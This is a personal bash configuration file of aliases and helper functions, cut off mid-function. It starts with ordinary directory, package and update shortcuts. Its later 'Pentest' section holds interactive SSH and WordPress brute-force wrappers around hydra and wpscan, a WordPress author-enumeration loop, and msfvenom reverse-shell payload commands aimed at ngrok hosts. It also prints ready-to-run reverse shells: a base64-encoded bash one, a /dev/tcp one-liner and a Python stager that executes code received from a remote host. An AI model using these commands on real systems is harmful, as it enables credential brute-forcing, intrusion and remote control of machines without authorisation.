: '■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■'
if [ -f $HOME/.dropbox-dist/dropbox-lnx.x86_64-119.4.1772/dropbox ]; then
	alias dropbox="$HOME/.dropbox-dist/dropbox-lnx.x86_64-119.4.1772/dropbox"
fi


: '■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■'
if [ -d $HOME/Documents ];
	then
		alias docs="cd ~/Documents"
else
	mkdir ~/Documents
	alias docs="cd ~/Documents"
fi
: '■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■'
if [ -d $HOME/Downloads ];
	then
		alias downloads="cd ~/Downloads"
else
	mkdir ~/Downloads
	alias downloads="cd ~/Downloads"
fi
: '■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■'
if [ -d $HOME/Etc ];
	then
		alias other="cd ~/Etc"
fi
: '■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■'
if [ -d $HOME/Multimedia ];
	then
		alias media="cd ~/Multimedia"
fi
: '■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■'

: '■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■'
if [ -f $HOME/.commands ]; then
	alias more-commands="more $HOME/.commands"
	alias head-commands="head -n 25 $HOME/.commands"
	alias tail-commands="tail -n 25 $HOME/.commands"
fi
: '■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■'
if [ -f $HOME/.memo.txt ]; then
	alias memo="geany $HOME/.memo.txt"
else
	touch $HOME/.memo.txt
fi
: '■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■'

: '■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■'
: '@@@@@    Git hub aliases    @@@@@'
if [ -d $HOME/Documents/GitHub_Help/Git_Projects ]; then
	alias git_projects="cd $HOME/Documents/GitHub_Help/Git_Projects"
fi
if [ -f /usr/bin/git ]; then
	alias get="git clone --depth 1 "
fi
: '■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■'

: '■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■'
if [ -f $HOME/scripts/youtube-dl ]; then
	alias dl='python2 $HOME/scripts/youtube-dl'
fi
: '■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■'

if [ -f /usr/bin/mpsyt ]; then
	alias mps="mpsyt"
fi

: '■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■'
if [ -f /usr/bin/jp2a ]; then
	alias ascii="jp2a "
	alias jp="jp2a "
fi
: '■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■'
if [[ -d $HOME/Pictures ]]; then
	alias pics="cd $HOME/Pictures"
fi

: '■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■'
if [ -d /run/media/wax/storage/Etc/WEB ]; then
	alias web="cd /run/media/wax/storage/Etc/WEB"
fi

: '■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■'
if [ -d $HOME/scripts/Github_Shit ]; then
	alias gitshit="cd $HOME/scripts/Github_Shit"
else
	alias gitshit="echo -e 'Directory not found'"
fi

: '■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■'
if [ -f /usr/bin/mpv ]; then
	alias music='mpv --playlist=/home/wax/Music --shuffle'
fi
: '■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■'
if [ -f $HOME/.dropbox-dist/dropbox-lnx.x86_64-119.4.1772/dropbox ]; then
	alias dropbox="$HOME/.dropbox-dist/dropbox-lnx.x86_64-119.4.1772/dropbox"
fi
: '■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■'
hist() {
	if [ -z $1 ]; then
		echo -e $BLINK$RED"History file being written to $HOME/.hist/history.$NOW.txt"$RESET$BOLD$GREEN
		history >> $HOME/.hist/history.$NOW.txt
	elif [[ ! -z $3 ]]; then 
		echo -e "Too many args: Only accepts $1 $2"
	elif [[ ${#2} -gt 0 ]]; then 
		echo -e $BLINK$GREEN"Writing history file to -- $1/$2.$NOW.txt"$RESET$BOLD$GREEN
		history >> $1/$2.$NOW.txt
	elif [[ ${#2} -le 0 ]]; then
		echo -e $BLINK$GREEN"Writing history file to -- $1/history.$NOW.txt"$RESET$BOLD$GREEN
		history >> $1/history.$NOW.txt
	else
		echo -e $WHITE"{$RED!$WHITE} Not recognized $WHITE{$RED!$WHITE}"
	fi
}
: '■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■'
if [ -d $HOME/scripts/Linux_More/Edu ]; then
	alias edu='cd $HOME/scripts/Linux_More/Edu '
	alias linux='cd /home/wax/scripts/Linux_More '
fi
: '■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■'
if [ -d $HOME/scripts/pentesting ]; then
	alias pentest='cd $HOME/scripts/pentesting && ls -al1t'
fi
: '■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■'
if [ -d $HOME/.py ]; then
	alias py='cd $HOME/.py'
fi
: '■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■'
if [[ -f /usr/bin/lsd ]] || [[ -f $HOME/scripts/lsd ]]; then
	alias lsd='lsd'
fi
: '■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■'
if [ -d /home/wax/scripts/pentesting/.hacked ]; then
	alias pwnd='cd /home/wax/scripts/pentesting/.hacked && ls -l'
fi
: '■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■'
if [ -f $HOME/.notes ]; then
	alias notes='cat $HOME/.notes | more'
fi

if [ -f $HOME/.pynotes ]; then
	alias pynotes='cat $HOME/.pynotes | more'
fi

if [ -f $HOME/.shnotes ];then
	bashnotes="cat $HOME/.shnotes | more"
fi
if [ -d $HOME/scripts/sys-info/bashtop ]; then
	alias btop='$HOME/scripts/sys-info/bashtop/bashtop'
else
	alias btop='echo -e "https://github.com/aristocratos/bashtop"'
fi
if [ -d $HOME/scripts/sys-info/bpytop ]; then
	alias ptop='python3 $HOME/scripts/sys-info/bpytop/bpytop.py'
else
	alias ptop='echo -e "https://github.com/aristocratos/bpytop"'
fi
if [ -d /usr/share/nmap/scripts ]; then
	alias nmap-scripts='ls /usr/share/nmap/scripts | more'
fi
if [ -f $HOME/scripts/pentesting/ngrok ]; then
	alias http='xterm -e "ngrok start webz"' #http -subdomain=tsec 80'
	alias tcp='xterm -e "ngrok start msf"' #tcp --remote-addr=3.tcp.ngrok.io:21617 1337
	alias sshon='xterm -e "ngrok start SSH"'
fi
if [ -f /usr/bin/php ]; then
	alias phpserver="php -S localhost:8000"
fi
if [ -f /bin/python3 ]; then
	alias pyserver="python2 -m SimpleHTTPServer"
fi
if [ -d $HOME/scripts/powershell ]; then
	alias pwsh=/home/wax/scripts/powershell/powershell/7/pwsh
fi
if [[ -f /bin/torctl ]]; then
	alias torctl='sudo torctl $@'
fi
if [[ -d $HOME/.apps ]]; then
	alias apps='cd $HOME/.apps'
	if [[ -f $HOME/.apps/remarkable/run.sh ]]; then
		alias md="$HOME/.apps/remarkable/run.sh ${@:1}"
	fi
fi
if [[ -e $HOME/scripts/dotdotpwn ]]; then
	alias dpwn='cd $HOME/scripts/dotdotpwn && ./dotdotpwn.pl'
fi
# My functions
: '■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■'
loading() {
# MY LOADING FUNCTION
	zero='0'
	e=(' ⠋ ⠙ ⠹ ⠸ ⠼ ⠴ ⠦ ⠧ ⠇ ⠏ ')
	f=('- \ | /')
	g=('↰ ↱ ↲ ↳')
	d=(' ◜ ◠ ◝ ◞ ◡ ◟ ')
	A=('🡼   🡽  🡿  🡾 🡺 🡸 🡹 🡻')
	B=('⦨ ⦩ ⦪ ⦫ ⦬ ⦭ ⦮ ⦯')
	echo -e $ORANGE
	for i in {1..10}; do
		for z in ${B[@]}; do
			printf "\r $z $i$zero%%"
			sleep 0.05
	done

	done 
	echo 
	return
}
function now {	# 09/26/21
	if [[ $1 = '-n' ]]; then
		echo $(date +%m-%d-%y--%I:%M)
		export NOW=$(date +%m-%d-%y--%I:%M)
	elif [[ $1 = '-t' ]] || [[ $1 = '-d' ]]; then
		echo $(date +%m-%d-%y)
	elif [[ $1 = '-e' ]]; then
		echo `echo $(date +%m-%d-%y--%I:%M) | base64`
	fi
}
function lac
{
    COMMANDS=`echo -n $PATH | xargs -d : -I {} find {} -maxdepth 1 \
        -executable -type f -printf '%P\n'`
    ALIASES=`alias | cut -d '=' -f 1`
    echo "$COMMANDS"$'\n'"$ALIASES" | sort -u
}
function version {
	local res=$?
	if [[ "$res" == "0" ]]; then
		SMCOL=${BLD}${COLGRN}
		SMILE="HI"
	else
		SMCOL=${BLD}${COLRED}
		SMILE="HI"
	fi
	$echo uname -a
	$echo lsb_release -a
}
function pc {
	local res=$?
	if [[ "$res" == "0" ]]; then
		SMCOL=${BLD}${COLGRN}
		SMILE="HI"
	else
		SMCOL=${BLD}${COLRED}
		SMILE="HI"
	fi
	$echo lspci
	$echo lscpu
	echo -ne ${SMCOL}${SMILE}
	echo ""
	return $res
}
# Move back directories
back(){
  local d=""
  limit=$1
  for ((i=1 ; i <= limit ; i++))
    do
      d=$d/..
    done
  d=$(echo $d | sed 's/^\///')
  if [ -z "$d" ]; then
    d=..
  fi
  cd $d
}


function rawgit {
	if [[ ${#1} -le 1 ]]; then
		read -p "Author: " AUTHOR
		read -p "Repo: " REPO
		read -p "File: " FILE
		read -p "Save ?: " answer1
		if [[ ${answer1} = 'y' ]] || [[ ${answer1} = 'yes' ]]; then
			read -p "File Name: " FILENAME
			curl https://raw.githubusercontent.com/${AUTHOR}/${REPO}/master/${FILE} -o ${FILENAME}
		else
			curl https://raw.githubusercontent.com/${AUTHOR}/${REPO}/master/${FILE}
		fi
	elif [[ ${#2} -le 1 ]] || [[ ${#3} -le 1 ]]; then
		echo -e "Usage: rawgit AUTHOR REPO FILE"
	elif [[ ${1} = '-s' ]] || [[ ${1} = '-save' ]]; then
		curl https://raw.githubusercontent.com/${1}/${2}/master/${3} -O
	else
		curl https://raw.githubusercontent.com/${1}/${2}/master/${3}
	fi
}
security(){
	curl -L meltdown.ovh -o spectre-meltdown-checker.sh && chmod +x spectre-meltdown-checker.sh
	sudo ./spectre-meltdown-checker.sh
	rm -f spectre-meltdown-checker.sh
}
# Update all pip2 and pip3 tools
pip3u() 
	{ 
		: 'lst=$(pip freeze | cut -d'=' -f1); 
		for i in $lst;   
		do     
			pip install -U $i --user;   
			unset lst; 
		done 
		'
		pip3 list --outdated --format=freeze | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 pip3 install -U 
}

pip2u()   
	{ 
		: '
		lst=$(pip2 freeze | cut -d'=' -f1); 
		for i in $lst;   
		do     
			pip2 install -U $i --user;   
			unset lst; 
		done 
		'
		pip2 list --outdated --format=freeze | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 pip2 install -U
}
updates() {
	TMPPATH="${TMPDIR:-/tmp}/checkup-db-${USER}"
	DBPATH="$(pacman-conf DBPath)"
	mkdir -p "$TMPPATH"
	ln -s "$DBPATH/local" "$TMPPATH" &>/dev/null
	fakeroot -- pacman -Sy --dbpath "$TMPPATH" --logfile /dev/null &>/dev/null
	pacman -Qu --dbpath "$TMPPATH" 2>/dev/null
	read -p "Upgrade packages now ? " answer
	if [ $answer = 'y' ]; then
		if [ -f /usr/bin/yaourt ]; then 
			yaourt -Syu
		else
			sudo pacman -Syu
		fi
	fi
}
# List and store all packages with package sizes optional
function packages {
echo -e '
╔══════════════════════════════════════════════════╗
║Check for a package     		      (00) ║ 
║Do All     				       (0) ║ 
║View Packages 				       (1) ║ 
║View & Store 				       (2) ║
║View Sizes Of Installed Packages              (3) ║ 
║View Packages By Size & Store Them            (4) ║
║View Packages Installed By Date 	       (5) ║ 
║View Packages Installed By Date & Store Them  (6) ║
║View Packages Installed and information       (7) ║
║View Packages Installed &  information & store(8) ║
╚══════════════════════════════════════════════════╝'
read -p 'Choice: ' choice
		if [[ $choice = "1" ]];		#View all packages, not sizes
			then
				#pacman -Qi | sed '/^Name/{ s/  *//; s/^.* //; H;N;d}; /^URL/,/^Build Date/d; /^Install Reason/,/^Description/d; /^  */d;x; s/^.*: ... //; s/Jan/01/;  s/Feb/02/;  s/Mar/03/;  s/Apr/04/;  s/May/05/;  s/Jun/06/;  s/Jul/07/;  s/Aug/08/; s/Sep/09/; s/Oct/10/;  s/Nov/11/;  s/Dec/12/; / [1-9]\{1\} /{ s/[[:digit:]]\{1\}/0&/3 }; s/\(^[[:digit:]][[:digit:]]\) \([[:digit:]][[:digit:]]\) \(.*\) \(....\)/\4-\1-\2 \3/' | sed ' /^[[:alnum:]].*$/ N; s/\n/ /; s/\(^[[:graph:]]*\) \(.*$\)/\2 \1/; /^$/d'
				pacman -Qq
		elif [[ $choice = "2" ]]; 		#View & store packages, no sizes
			then
				#pacman -Qi | sed '/^Name/{ s/  *//; s/^.* //; H;N;d}; /^URL/,/^Build Date/d; /^Install Reason/,/^Description/d; /^  */d;x; s/^.*: ... //; s/Jan/01/;  s/Feb/02/;  s/Mar/03/;  s/Apr/04/;  s/May/05/;  s/Jun/06/;  s/Jul/07/;  s/Aug/08/; s/Sep/09/; s/Oct/10/;  s/Nov/11/;  s/Dec/12/; / [1-9]\{1\} /{ s/[[:digit:]]\{1\}/0&/3 }; s/\(^[[:digit:]][[:digit:]]\) \([[:digit:]][[:digit:]]\) \(.*\) \(....\)/\4-\1-\2 \3/' | sed ' /^[[:alnum:]].*$/ N; s/\n/ /; s/\(^[[:graph:]]*\) \(.*$\)/\2 \1/; /^$/d' > $HOME/Documents/all_packages.conf
				pacman -Qq > $HOME/Documents/all_packages.conf
		elif [[ $choice = "3" ]];		#Store packages and sizes
			then	
				#LC_ALL=C pacman -Qi | awk '/^Name/{name=$3} /^Installed Size/{print $4$5, name}' | sort -h 
				pacman -Qi | awk 'BEGIN{sort="sort -k2 -n"} /Name/ {name=$3} /Size/ {size=$4/1024;print name":",size,"Mb"|sort}'
		elif [[ $choice = "4" ]];
			then	
				LC_ALL=C pacman -Qi | awk '/^Name/{name=$3} /^Installed Size/{print $4$5, name}' | sort -h > $HOME/Documents/all_packages_sizes.conf
		elif [[ $choice = "5" ]];
			then
				expac --timefmt='%m/%d/%y %r ' '%l\t%n'|sort -n
		elif [[ $choice = "6" ]];
			then
				expac --timefmt='%m/%d/%y %r ' '%l\t%n'|sort -n > $HOME/Documents/all_packages_installed_by_date.conf
		elif [[ $choice = "0" ]]; then
			pacman -Qq > $HOME/Documents/all_packages.conf
			LC_ALL=C pacman -Qi | awk '/^Name/{name=$3} /^Installed Size/{print $4$5, name}' | sort -h > $HOME/Documents/all_packages_sizes.conf
			expac --timefmt='%m/%d/%y %r ' '%l\t%n'|sort -n > $HOME/Documents/all_packages_installed_by_date.conf
			sudo pacman -Qii >> $HOME/Documents/all_packages_and_info.conf
		elif [ $choice = '7' ]; then
			sudo pacman -Qii | more
		elif [ $choice = '8' ]; then
			sudo pacman -Qii >> $HOME/Documents/all_packages_and_info.conf
		elif [ $choice = '00' ]; then
			echo -e "Grep ?"
			read -p ">_ " grp
			pacman -Qq | grep --color=always $grp
		else
			echo -e "Incorrect Choice"
		fi
}


#==>Pentest
proxyon(){
        export http_proxy=socks5://127.0.0.1:9050 https_proxy=socks5://127.0.0.1:9050
}
proxyoff(){
        unset http_proxy && unset https_proxy
}
function pyns { 	# 10/05/21
	python3 <<EOF
import socket;
ip_list2 = list({addr[-1][0] for addr in socket.getaddrinfo("${@:1}", 0, 0, 0, 0)})
print("\n".join(ip_list2))
EOF
}
myip() {
	curl https://json.geoiplookup.io/
}	
sshbrute(){
echo -e $ORANGE"
░▀█▀░█▀▀░█▀▀░█▀▀░░░█▀▀░█▀▀░█░█░░░█▀▄░█▀▄░█░█░▀█▀░█▀▀
░░█░░▀▀█░█▀▀░█░░░░░▀▀█░▀▀█░█▀█░░░█▀▄░█▀▄░█░█░░█░░█▀▀
░░▀░░▀▀▀░▀▀▀░▀▀▀░░░▀▀▀░▀▀▀░▀░▀░░░▀▀░░▀░▀░▀▀▀░░▀░░▀▀▀
┏┓┓┓━┓┳━┓┏━┓  ┓━┓┓━┓┳ ┳  ┳━┓┳━┓┳ ┓┏┓┓┳━┓
 ┃ ┗━┓┣━ ┃    ┗━┓┗━┓┃━┫  ┃━┃┃┳┛┃ ┃ ┃ ┣━ 
 ┇ ━━┛┻━┛┗━┛  ━━┛━━┛┇ ┻  ┇━┛┇┗┛┇━┛ ┇ ┻━┛

           55H Brut3 F0rc3
"
if [ -x /usr/bin/hydra ];then
	echo -e $GREEN'['$WHITE'!'$GREEN']'$ORANGE'Hydra Found'
	read -p 'Enter the username to use: ' USERNAME
	read -p 'Enter the IP address to brute force: ' IP
	echo -e $WHITE'Type "list" to list available wordlists. Tyep "custom" to use your own ' 
	read -p '$ ' LIST
	if [ $LIST = 'list' ]; then
		echo -e $GREEN'Contents of $HOME/Wordlists'
		ls $HOME/Wordlists
		echo -e $WHITE'E.g "passlist.txt"'
		read -p 'Choose a wordlist ' WORDLIST
		hydra -s -v -V -l $USERNAME -P $HOME/Wordlists/$WORDLIST -c 2 -t 4 $IP ssh
		#hydra -s -v -V -l $USER -P $HOME/.wordlists/$LIST -t 4 $IP ssh
	elif [[ $LIST = 'custom' ]] || [[ $LIST = 'c' ]]; then
		echo -e $GREEN'***HINT***'
		echo -e $WHITE'/home/'$USER'/wordlist.txt'
		read -p '$ ' WLIST
		hydra -s -v -V -l $USERNAME -P $WLIST -c 2 -t 4 $IP ssh
	else
		echo -e ${RED}'Invalid selection'
	fi
else
	echo -e $RED'['$WHITE'!'$RED']'$ORANGE'Hydra Not Found In System'
	read -p 'Would you like to install it ?[y/n] ' ANSWER
	if [ $ANSWER = 'y' ]
		then 
			if grep -q arch /etc/os-release; 
			then
				sudo pacman -S hydra 
				read -p 'Enter the username to use: ' USERNAME
				read -p 'Enter the IP address to brute force: ' IP
				echo -e $WHITE'Type "list" to list available wordlists. Tyep "custom" to use your own ' 
				read -p '$ ' LIST
				if [ $LIST = 'list' ]; then
					echo -e $GREEN'Contents of /usr/share/wordlists/passwords'
					ls /usr/share/wordlists/passwords
					echo -e $WHITE'E.g "passlist.txt"'
					read -p 'Choose a wordlist ' WORDLIST
					hydra -s -v -V -l $USERNAME -P /usr/share/wordlists/passwords/$WORDLIST -t 4 $IP ssh
				hydra -s -v -V -l $USERNAME -P /usr/share/wordlists/passwords/$LIST -t 4 $IP ssh
				elif [ $LIST = 'custom' ]; then
					echo -e $GREEN'***HINT***'
					echo -e $WHITE'/home/'$USER'/wordlist.txt'
					read -p '$ ' WLIST
					hydra -s -v -V -l $USERNAME -P $WLIST -t 4 $IP ssh
				else
					echo -e $RED'Invalid selection'
				fi
			elif grep -q bian /etc/os-release;
			then
				sudo apt-get install hydra
				read -p 'Enter the username to use: ' USERNAME
				read -p 'Enter the IP address to brute force: ' IP
				echo -e $WHITE'Type "list" to list available wordlists. Tyep "custom" to use your own ' 
				read -p '$ ' LIST
				if [ $LIST = 'list' ]; then
					echo -e $GREEN'Contents of /usr/share/wordlists/passwords'
					ls /usr/share/wordlists/passwords
					echo -e $WHITE'E.g "passlist.txt"'
					read -p 'Choose a wordlist ' WORDLIST
					hydra -s -v -V -l $USERNAME -P /usr/share/wordlists/passwords/$WORDLIST -t 4 $IP ssh
				hydra -s -v -V -l $USERNAME -P /usr/share/wordlists/passwords/$LIST -t 4 $IP ssh
				elif [ $LIST = 'custom' ]; then
					echo -e $GREEN'***HINT***'
					echo -e $WHITE'/home/'$USER'/wordlist.txt'
					read -p '$ ' WLIST
					hydra -s -v -V -l $USERNAME -P $WLIST -t 4 $IP ssh
				else
					echo -e $RED'Invalid selection'
				fi
			else
				echo -e $RED'Wrong selection'
			fi
	else
		echo -e $RED'No Brute Force For You !'
	fi
fi
}
wpbrute(){
	read -p "HOST $ " HOST
	read -p "Wordlist $ " LIST
	read -p "Username $ " USER
	sudo wpscan --url $HOST --usernames $USER --passwords $LIST
}
enum(){
	read -p "Host $ " HOST
	for i in {1..5}; do curl -s -L -i http://$HOST/?author=$i | grep --color=always -E -o "\" title=\"View all posts by [a-z0-9A-Z\-\.]*|Location:.*" | sed 's/\// /g' | cut -f 6 -d ' ' | grep --color=always -v "^$"; done
}
function msf {	# 06/22/21
	if [[ $1 = '-s' ]] || [[ $1 = '--start' ]]; then
		sudo systemctl restart postgresql
		msfconsole -q -x "db_connect msf;  set Prompt pwnd@You "
	elif [[ $1 = '-r' ]] || [[ $1 = '--run' ]]; then
		msfconsole -q -x "db_connect msf;  set Prompt pwnd@You "
	elif [[ $1 = '-c' ]] || [[ $1 = '--command' ]]; then
		msfconsole -q -x 'db_connect msf; set Prompt pwnd@You; $2'
	elif [[ $1 = '-cs' ]] || [[ $1 = '--command-start' ]]; then
		sudo systemctl restart postgresql
		msfconsole -q -x  'db_connect msf; set Prompt exploit@Windows95; $2'
	elif [[ $1 = '-p' ]] || [[ $1 = '--payloads' ]]; then
		echo -e "
msfvenom -p python/meterpreter/reverse_tcp LHOST=6.tcp.ngrok.io LPORT=17081 -f raw > payload.py
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=10.104.124.89 LPORT=13990 -f elf > bind.elf
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=8.tcp.ngrok.io LPORT=14987 -a x64 -f elf > shell.elf
msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 LHOST=6.tcp.ngrok.io LPORT=14169 -f exe -o shell.exe
"
	else
		echo -e "Either -r/--run if postgresql is running, or -s/--start to start postgresql"
	fi
}
#┇━┛┇┗╋┛┇┇━┛┇┗╋┛┇┇━┛┇┗╋┛┇┇━┛┇┗╋┛┇┇━┛┇┗╋┛┇┇━┛┇┗╋┛┇┇━┛┇┗╋┛┇┇━┛┇┗╋┛┇
rshell() {	# 07/04/21
	help() {
		echo -e "$PURPLE rshell [-h HELP] [-l LIST] [-p PORT] [-u URL] [-f FILE] [-e EXPLOIT_FORMAT] [-g RUN] [-c CREATE, NOT RUN]"
		echo -e "$WHITE
FORMATS:
[windows | exe] [linux-elf | elf] [python | any] [linux-sh | sh] [!list!] [!custom!]"
		echo -e "$WHITE
PAYLOADS:$BLUE
-p$BRIGHT_GREEN python/meterpreter/reverse_tcp LHOST=URL LPORT=PORT -f raw > FILE.py$BLUE
-p$BRIGHT_GREEN linux/x64/meterpreter/reverse_tcp LHOST=URL LPORT=PORT -a x64 -f elf > FILE.elf$BLUE
-p$BRIGHT_GREEN windows/x64/meterpreter/reverse_tcp -a x64 LHOST=URL LPORT=PORT -f exe -o FILE.exe$BLUE
-p$BRIGHT_GREEN cmd/unix/reverse_bash LHOST=URL LPORT=PORT -f raw > FILE.sh"
		echo -e "$WHITE
COMMAND:
$BRIGHT_GREEN  -f$WHITE FILE$BLUE	Name of the payload file.
$BRIGHT_GREEN  -p$WHITE PORT$BLUE	Set Ngrok's port.
$BRIGHT_GREEN  -u$WHITE URL$BLUE	Ngrok's URL.
$BRIGHT_GREEN  -e$WHITE EXPLOIT$BLUE	Exploit format [py|sh|elf|exe].
$BRIGHT_GREEN  -h$BLUE		show this help menu.
$BRIGHT_GREEN  -g$BLUE		Create payload and launch listener.
$BRIGHT_GREEN  -c$BLUE		Create payload. Don't launch listener.
$BRIGHT_GREEN  -i$BLUE		Interactive; skip using all the CLI args.
$BRIGHT_GREEN  -l$BLUE		List payloads."
		echo -e "$WHITE
PAYLOAD EXAMPLES:$BLUE
BASH:$BRIGHT_GREEN
base64 -d <<< MDwmNTItO2V4ZWMgNTI8Pi9kZXYvdGNwLzMudGNwLm5ncm9rLmlvLzIxNjE3O3NoIDwmNTIgPiY1MiAyPiY1Mgo= | bash
0<&59-;exec 59<>/dev/tcp/3.tcp.ngrok.io/21617;sh <&59 >&59 2>&59 $BLUE
PYTHON:$BRIGHT_GREEN
import socket,zlib,base64,struct,time
for x in range(10):
try:
	s=socket.socket(2,socket.SOCK_STREAM)
	s.connect(('3.tcp.ngrok.io',21617))
	break
except:
	time.sleep(5)
l=struct.unpack('>I',s.recv(4))[0]
d=s.recv(l)
while len(d)<l:
d+=s.recv(l-len(d))
exec(zlib.decompress(base64.b64decode(d)),{'s':s})

"
	}
	run()	{
		if [[ $exploit = 'windows' ]] || [[ $exploit = 'exe' ]]; then
			msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 LHOST=$addr LPORT=$port -f exe -o $file.exe
			msfconsole -q -x "set Prompt exploit@Windows95; set PromptChar ==>; db_connect msf; use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp;set lhost $addr; set lport 1337"
		elif [[ $exploit = 'linux-elf' ]] || [[ $exploit = 'elf' ]]; then
			msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$addr LPORT=$port -a x64 -f elf > $file.elf
			msfconsole -q -x "set Prompt exploit@Windows95; set PromptChar ==>; db_connect msf; use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp;set lhost $addr; set lport 1337"
		elif [[ $exploit = 'any' ]] || [[ $answer = 'python' ]]; then
			msfvenom -p python/meterpreter/reverse_tcp LHOST=$addr LPORT=$port -f raw > $file.py
			msfconsole -q -x "set Prompt exploit@Windows95; set PromptChar ==>; db_connect msf; use exploit/multi/handler; set payload python/meterpreter/reverse_tcp;set lhost $addr; set lport 1337"
		elif [[ $exploit = 'linux-sh' ]] || [[ $exploit = 'sh' ]]; then
			msfvenom -p cmd/unix/reverse_bash LHOST=$addr LPORT=$port -f raw > $file.sh
			msfconsole -q -x "set Prompt exploit@Windows95; set PromptChar ==>; db_connect msf; use exploit/multi/handler; set payload cmd/unix/reverse_bash;set lhost $addr; set lport 1337"
		elif [[ $exploit = 'list' ]] || [[ $exploit = 'l' ]]; then
			 msfvenom --list payloads
		elif [[ $exploit = 'custom' ]] || [[ $exploit = 'c' ]]; then
			echo ""
		fi
	}
	create()	{
		if [[ $exploit = 'windows' ]] || [[ $exploit = 'exe' ]]; then
			msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 LHOST=$addr LPORT=$port -f exe -o $file.exe
		elif [[ $exploit = 'linux' ]] || [[ $exploit = 'elf' ]]; then
			msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$addr LPORT=$port -a x64 -f elf > $file.elf
		elif [[ $exploit = 'py' ]] || [[ $answer = 'python' ]]; then
			msfvenom -p python/meterpreter/reverse_tcp LHOST=$addr LPORT=$port -f raw > $file.py
		elif [[ $exploit = 'bash' ]] || [[ $exploit = 'sh' ]]; then
			msfvenom -p cmd/unix/reverse_bash LHOST=$addr LPORT=$port -f raw > $file.sh
		elif [[ $exploit = 'list' ]] || [[ $exploit = 'l' ]]; then
			 msfvenom --list payloads
		elif [[ $exploit = 'custom' ]] || [[ $exploit = 'c' ]]; then
			echo ""
		fi
	}
	interactive()	{
		echo -e "Ngrok Port"
		read -p "==> " port
		export port
		echo -e "Ngrok URL"
		read -p "==> " addr
		export addr
		echo -e "Payload name"
		read -p "==> " file 
		export file
		echo -e "Exploit format" 
		read -p "==> " exploit
		export exploit
		echo -e "Open msf after creating payload ?"
		read -p "==> " answer
		if [[ $answer = 'y' ]] || [[ $answer = 'yes' ]]; then
			run
		else
			create
		fi
	}
	local opts
	local OPTIND
